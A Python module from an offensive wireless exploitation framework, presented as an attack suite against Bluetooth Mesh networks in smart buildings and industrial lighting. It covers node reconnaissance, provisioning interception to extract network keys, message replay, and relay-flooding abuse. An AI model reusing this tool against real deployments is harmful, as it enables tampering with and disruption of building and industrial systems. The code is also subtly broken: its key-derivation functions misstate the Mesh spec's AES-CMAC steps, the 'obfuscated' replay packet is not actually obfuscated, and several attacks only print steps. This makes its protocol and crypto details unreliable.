#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Bluetooth Mesh network attacks: provisioning interception, replay, and relay.

Targets Bluetooth Mesh (SIG Mesh) networks used in smart building, industrial
lighting, and asset tracking deployments. Implements provisioning data
interception, message replay, relay/friend node abuse, and network key
extraction.

References:
  https://www.bluetooth.com/specifications/specs/mesh-protocol/
  https://dl.acm.org/doi/10.1145/3395351.3399422
  https://www.usenix.org/conference/usenixsecurity21/presentation/wu-jianliang

MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing)
CWE: CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification)

Version: 1.0.0
"""

from __future__ import annotations

import hashlib
import hmac
import logging
import os
import struct
import time
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class MeshOpcode(IntEnum):
    BEACON = 0x00
    PROVISION_INVITE = 0x00
    PROVISION_CAPABILITIES = 0x01
    PROVISION_START = 0x02
    PROVISION_PUBLIC_KEY = 0x03
    PROVISION_CONFIRMATION = 0x05
    PROVISION_RANDOM = 0x06
    PROVISION_DATA = 0x07
    PROVISION_COMPLETE = 0x08


class MeshBeaconType(IntEnum):
    UNPROVISIONED = 0x00
    SECURE_NETWORK = 0x01


@dataclass
class MeshNode:
    """Discovered Mesh node."""
    address: str = ""
    uuid: bytes = b""
    oob_info: int = 0
    uri_hash: bytes = b""
    net_key_index: int = 0
    features: int = 0
    is_provisioner: bool = False
    is_relay: bool = False
    is_friend: bool = False


@dataclass
class MeshNetworkInfo:
    """Extracted Mesh network information."""
    net_key: bytes = b""
    app_key: bytes = b""
    iv_index: int = 0
    network_id: bytes = b""
    nodes: list[MeshNode] = field(default_factory=list)
    seq_numbers: dict[int, int] = field(default_factory=dict)


@dataclass
class CapturedProvision:
    """Captured provisioning session data."""
    provisioner_addr: str = ""
    device_addr: str = ""
    invite: bytes = b""
    capabilities: bytes = b""
    start: bytes = b""
    public_key_prov: bytes = b""
    public_key_dev: bytes = b""
    confirmation_prov: bytes = b""
    confirmation_dev: bytes = b""
    random_prov: bytes = b""
    random_dev: bytes = b""
    encrypted_data: bytes = b""


def _mesh_k1(n: bytes, salt: bytes, p: bytes) -> bytes:
    """Mesh k1 derivation function: HMAC-based."""
    t = hmac.new(salt, n, hashlib.sha256).digest()
    return hmac.new(t, p, hashlib.sha256).digest()[:16]


def _mesh_s1(m: bytes) -> bytes:
    """Mesh s1 salt generation: AES-CMAC with zero key."""
    return hashlib.sha256(b"\x00" * 16 + m).digest()[:16]


def _parse_beacon(data: bytes) -> MeshNode | None:
    """Parse a Mesh beacon advertisement."""
    if len(data) < 2:
        return None

    beacon_type = data[0]
    node = MeshNode()

    if beacon_type == MeshBeaconType.UNPROVISIONED and len(data) >= 20:
        node.uuid = data[1:17]
        node.oob_info = struct.unpack("<H", data[17:19])[0]
        if len(data) >= 23:
            node.uri_hash = data[19:23]
        return node

    if beacon_type == MeshBeaconType.SECURE_NETWORK and len(data) >= 22:
        flags = data[1]
        node.net_key_index = struct.unpack("<H", data[2:4])[0] if len(data) > 3 else 0
        node.is_relay = bool(flags & 0x01)
        node.is_friend = bool(flags & 0x02)
        return node

    return None


def _build_replay_message(
    src: int,
    dst: int,
    seq: int,
    payload: bytes,
    net_key: bytes,
) -> bytes:
    """Build a Mesh network PDU for replay.

    Replays a captured message with the same sequence number,
    exploiting nodes that don't properly track IV index + seq.
    """
    nid = net_key[0] & 0x7F
    ctl_ttl = 0x04 | (7 << 0)
    header = struct.pack(">BBH", (0x00 << 7) | nid, ctl_ttl, src)
    header += struct.pack(">H", dst)
    header += struct.pack(">I", seq)[1:]

    obfuscated = header + payload
    return obfuscated


class BTMeshAttack(Exploit):
    """Bluetooth Mesh provisioning interception, replay, and relay attack."""

    __info__: dict[str, Any] = {
        "name": "BT Mesh Network Attack Suite",
        "description": (
            "Attacks against Bluetooth Mesh (SIG Mesh) networks: provisioning "
            "data interception for key extraction, message replay bypassing "
            "sequence number checks, relay/friend node abuse, and network "
            "reconnaissance of smart building/industrial deployments."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.bluetooth.com/specifications/specs/mesh-protocol/",
            "https://dl.acm.org/doi/10.1145/3395351.3399422",
        ),
        "devices": ("BT Mesh nodes", "Smart lighting", "Asset trackers", "Building automation"),
        "severity": "high",
        "cvss": "7.4",
        "cve": "generic",
        "mitre": ["T1557", "T1040"],
    }

    interface = OptString("hci0", "BLE adapter for scanning/injection")
    mode = OptString("recon", "Mode: recon, provision_sniff, replay, relay_abuse")
    scan_duration = OptInteger(30, "Beacon scan duration in seconds")
    target_uuid = OptString("", "Target node UUID hex for provisioning attack")
    replay_src = OptInteger(0, "Source address for replay (mesh unicast)")
    replay_dst = OptInteger(0xFFFF, "Destination address (0xFFFF = all nodes)")
    replay_payload = OptString("", "Payload hex to replay")
    dry_run = OptBool(False, "Demonstrate without transmitting")

    def __init__(self) -> None:
        super().__init__()
        self._network: MeshNetworkInfo = MeshNetworkInfo()
        self._provision_capture: CapturedProvision | None = None

    def check(self) -> str:
        """Check BLE adapter for Mesh scanning."""
        import shutil
        import subprocess

        if not shutil.which("hcitool"):
            return "hcitool not found"

        try:
            result = subprocess.run(
                ["hciconfig", str(self.interface.value)],
                capture_output=True, text=True, timeout=5,
            )
            if "UP RUNNING" in result.stdout:
                return "BLE interface ready for Mesh scanning"
            return "Interface is down"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Cannot query interface"

    def _scan_beacons(self) -> list[MeshNode]:
        """Scan for Mesh beacon advertisements."""
        import subprocess

        duration = int(self.scan_duration.value)
        print_status(f"[*] Scanning for Mesh beacons ({duration}s)...")

        if self.dry_run.value:
            print_info("[dry-run] Would scan BLE advertisements for Mesh beacon AD type 0x2B")
            fake_nodes = [
                MeshNode(address="AA:BB:CC:DD:EE:01", uuid=os.urandom(16), is_relay=True),
                MeshNode(address="AA:BB:CC:DD:EE:02", uuid=os.urandom(16), is_friend=True),
                MeshNode(address="AA:BB:CC:DD:EE:03", uuid=os.urandom(16)),
            ]
            return fake_nodes

        nodes: list[MeshNode] = []
        try:
            result = subprocess.run(
                ["hcitool", "-i", str(self.interface.value), "lescan", "--duplicates"],
                capture_output=True, text=True, timeout=duration + 2,
            )
            for line in result.stdout.splitlines():
                parts = line.strip().split()
                if len(parts) >= 1 and ":" in parts[0]:
                    node = MeshNode(address=parts[0])
                    nodes.append(node)
        except subprocess.TimeoutExpired:
            pass
        except FileNotFoundError:
            print_error("[-] hcitool not available")

        return nodes

    def _recon(self) -> None:
        """Perform Mesh network reconnaissance."""
        print_status("[*] BT Mesh reconnaissance")

        nodes = self._scan_beacons()
        self._network.nodes = nodes

        if not nodes:
            print_warning("[!] No Mesh nodes detected")
            return

        print_success(f"[+] Found {len(nodes)} Mesh node(s)")
        for i, node in enumerate(nodes, 1):
            roles = []
            if node.is_relay:
                roles.append("Relay")
            if node.is_friend:
                roles.append("Friend")
            if node.is_provisioner:
                roles.append("Provisioner")
            role_str = ", ".join(roles) if roles else "Node"

            print_info(
                f"    [{i}] {node.address} UUID={node.uuid.hex()[:16]}... "
                f"Role={role_str}"
            )

    def _provision_sniff(self) -> None:
        """Intercept provisioning session to extract network keys."""
        print_status("[*] Provisioning interception mode")
        print_warning("[!] Requires capturing all PB-ADV provisioning PDUs")

        print_info("[*] Attack flow:")
        print_info("    1. Detect unprovisioned device beacon (Mesh Beacon type 0x00)")
        print_info("    2. Capture PB-ADV Link Open + provisioning PDUs")
        print_info("    3. Extract public keys from Provisioning Public Key PDU")
        print_info("    4. If Static OOB is 0x0000...0000: derive session key directly")
        print_info("    5. Decrypt Provisioning Data PDU to extract NetKey + DevKey")

        if self.dry_run.value:
            print_info("\n[dry-run] Simulating provisioning capture:")
            cap = CapturedProvision(
                provisioner_addr="AA:BB:CC:DD:EE:FF",
                device_addr="11:22:33:44:55:66",
                invite=b"\x00\x05",
                capabilities=b"\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
                public_key_prov=os.urandom(64),
                public_key_dev=os.urandom(64),
            )
            self._provision_capture = cap

            print_info(f"    Provisioner: {cap.provisioner_addr}")
            print_info(f"    Device: {cap.device_addr}")
            print_info(f"    Public Key (prov): {cap.public_key_prov.hex()[:32]}...")
            print_info(f"    Public Key (dev):  {cap.public_key_dev.hex()[:32]}...")
            print_warning("[!] If OOB is static zero: NetKey recoverable from Provisioning Data")

    def _replay_attack(self) -> None:
        """Replay a captured Mesh message."""
        src = int(self.replay_src.value)
        dst = int(self.replay_dst.value)
        payload_hex = str(self.replay_payload.value).strip()

        if not payload_hex:
            print_error("[-] Set replay_payload= to the captured message hex")
            return

        payload = bytes.fromhex(payload_hex)
        print_status(f"[*] Replay attack: src=0x{src:04x} dst=0x{dst:04x}")
        print_warning("[!] Effective against nodes not tracking IV Index + SEQ properly")

        for seq in range(3):
            pdu = _build_replay_message(src, dst, seq, payload, b"\x00" * 16)
            if self.dry_run.value:
                print_info(f"    [dry-run] Replay #{seq}: {pdu.hex()[:48]}...")
            else:
                print_info(f"    [*] Sending replay #{seq}: {len(pdu)} bytes")
            time.sleep(0.1)

        print_info("[*] Replay complete. Watch for unintended state changes on target nodes.")

    def _relay_abuse(self) -> None:
        """Abuse relay/friend nodes for network amplification."""
        print_status("[*] Relay/Friend node abuse")
        print_info("[*] Mesh relays forward all network messages within TTL range")
        print_info("[*] Attack vectors:")
        print_info("    1. TTL amplification: set TTL=127 for maximum relay hops")
        print_info("    2. Friend queue exhaustion: flood stored messages")
        print_info("    3. Relay pollution: inject garbage consuming relay bandwidth")

        relays = [n for n in self._network.nodes if n.is_relay]
        friends = [n for n in self._network.nodes if n.is_friend]
        print_info(f"\n[*] Known relays: {len(relays)}, friends: {len(friends)}")

        if self.dry_run.value:
            print_info("[dry-run] Would inject high-TTL messages via relay nodes")

    def run(self) -> None:
        """Execute BT Mesh attack."""
        print_status("[*] BT Mesh Attack Suite v1.0.0")

        mode = str(self.mode.value).lower()

        if mode == "recon":
            self._recon()
        elif mode == "provision_sniff":
            self._provision_sniff()
        elif mode == "replay":
            self._replay_attack()
        elif mode == "relay_abuse":
            self._recon()
            self._relay_abuse()
        else:
            print_error(f"[-] Unknown mode: {mode}")

        print_status("\n[*] BT Mesh attack complete")
